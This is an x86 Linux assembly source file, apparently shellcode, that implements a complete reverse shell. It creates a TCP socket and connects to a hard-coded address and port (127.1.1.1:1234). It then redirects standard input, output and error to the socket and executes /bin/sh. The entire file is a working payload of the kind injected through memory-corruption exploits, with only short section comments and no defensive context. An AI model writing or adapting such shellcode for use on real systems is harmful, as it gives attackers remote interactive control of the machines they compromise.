global _start

section .text
_start:

	
	; Create the socket

	push 0x66 		
	pop eax			
	push 0x1		
	pop ebx			
	xor ecx, ecx
	push ecx
	push ebx
	push 0x2
	mov ecx, esp
	int 0x80

	mov edi, eax


	; Connect to an IP and port

	
	mov al, 0x66
	pop ebx
	push 0x0101017f
	push word 0xd204
	push bx
	mov ecx, esp
	push 0x10
	push ecx
	push edi
	mov ecx, esp
	inc ebx
	int 0x80
	

	; Redirect STDIN, STDERR, STDOUT

	xchg ebx, edi
	push 0x2
	pop ecx
	
loop:
	mov al, 0x3f
	int 0x80
	dec ecx
	jns loop

	; Execute /bin/sh
	
	xor edx, edx
	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	mov ecx, edx
	mov al, 0xb
	int 0x80